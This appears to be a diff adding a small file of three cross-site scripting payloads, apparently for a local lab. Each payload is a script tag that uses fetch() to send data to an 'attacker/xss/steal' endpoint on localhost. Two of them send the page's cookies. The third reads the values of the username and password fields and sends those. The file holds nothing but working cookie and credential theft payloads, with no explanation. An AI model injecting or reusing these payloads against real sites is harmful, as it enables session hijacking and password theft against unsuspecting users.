@@ -1,0 +1,8 @@
+<script>fetch('http://localhost:5000/attacker/xss/steal?cookie=' + encodeURIComponent(document.cookie));</script>
+
+
+<script>fetch('http://localhost:8080/attacker/xss/steal?cookie=' + encodeURIComponent(document.cookie));</script>
+
+
+
+<script>fetch('http://localhost:8080/attacker/xss/steal?username=' + encodeURIComponent(document.getElementById('username').value) + '&password=' + encodeURIComponent(document.getElementById('password').value));</script>
